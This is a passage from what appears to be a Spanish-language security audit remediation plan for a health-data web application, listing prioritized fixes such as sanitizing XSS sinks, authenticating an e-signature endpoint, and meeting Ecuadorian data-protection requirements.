4. **CRIT-04 + CRIT-05**: sanitizar todos los sinks XSS identificados y eliminar el flujo de `password_hash` en texto plano.
5. **CRIT-08 + CRIT-09**: agregar segundo factor antes de revelar PII/datos clínicos por cédula o teléfono, y atar el modo call center a un teléfono de agente autorizado por empresa.
6. **CRIT-10 + CRIT-12**: autenticar `api/firma-electronica.js` y mover el `.p12` fuera del blanket RLS de `usuarios`.
7. **CRIT-11**: agregar bloqueo de edición post-firma (columna de estado + `WITH CHECK`) y versionado del PDF en Storage.
8. **LOPDP**: publicar política de privacidad + consentimiento explícito en todos los flujos de recolección de datos de salud (validar redacción con abogado ecuatoriano especializado en LOPDP antes de publicar).

### Alta prioridad — resolver muy pronto después de bloquear el lanzamiento (o antes, si el cronograma lo permite)
- H1-H10 completos (attribute injection, ownership scoping en `/api`, OTP básico, sanear `telefono` en filtros PostgREST, políticas de Storage documentadas y atadas a sesión real, autenticación en `enviar-docs`/`enviar-link`).
- Corregir el mensaje de "anonimato" en la evaluación psicosocial.
- Definir procedimiento (aunque manual) de derechos ARCO+ y de notificación de brechas.

### No bloqueante — endurecimiento antes o poco después del lanzamiento
- M1-M12 (encodeURIComponent consistente, mensajes de error genéricos, CORS restringido, Vercel Deployment Protection, limpiar `src/vercel.json`, validación MIME real de PDFs, reintento de TSA, eliminar certificados de prueba de la rama `prototipo/firma-p12-pdf` antes de mergear).
- Validaciones legales pendientes con abogado: registro SPDP, necesidad de DPD, marco de transferencia internacional (DPAs con Supabase/Meta/Google), retención cruzada LOPDP/normativa MSP de historia clínica.

### Bajo / mejora continua
- L1-L7 (rate limiting de login a confirmar en Supabase Auth, logs sin redactar texto clínico, limpieza de credenciales Twilio obsoletas, upsert atómico en sesiones, comparación constant-time en firma de webhook).
